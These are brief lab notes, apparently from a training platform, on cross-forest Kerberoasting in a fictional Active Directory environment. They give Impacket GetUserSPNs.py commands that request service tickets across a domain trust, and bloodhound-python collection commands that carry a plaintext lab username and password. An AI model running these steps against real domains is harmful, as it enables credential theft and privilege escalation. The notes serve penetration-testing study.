# Cross-Forest Kerberoasting
#### Using GetUsersSPNs.py
`GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
 Then using the requesting flag
 `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
#### Adding the domain to the /etc/resolv.conf
`domain INLANEFREIGHT.LOCAL`
`domain FREIGHTLOGISTICS.LOCAL`

#### Running bloodhound against the domains
`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
Or
`bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`
Then Compressing the files into a zip for the bloodhound
`zip -r ilfreight_bh.zip *.json`

#### Bloodhound
Looking into the Dangerous Rights
